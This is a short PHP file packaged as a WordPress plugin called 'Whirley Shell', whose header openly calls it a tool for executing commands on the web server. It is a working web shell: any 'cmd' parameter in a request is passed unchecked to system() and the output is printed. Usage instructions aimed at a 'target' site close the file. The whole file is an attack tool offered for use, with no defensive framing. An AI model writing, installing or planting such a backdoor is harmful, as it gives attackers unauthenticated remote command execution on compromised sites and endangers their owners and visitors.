<?php
    /*
    Plugin Name: Whirley Shell
    Plugin URI: https://github.com/leonjza/wordpress-shell
    Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/plugin-shell/plugin-shell.php. Commands can be given using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=id", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>
    Author: Wh1r13y
    Version: 0.1
    Author URI: http://W1r13y.com
    */

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}


echo "Usage: http://target.com/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=<command>";

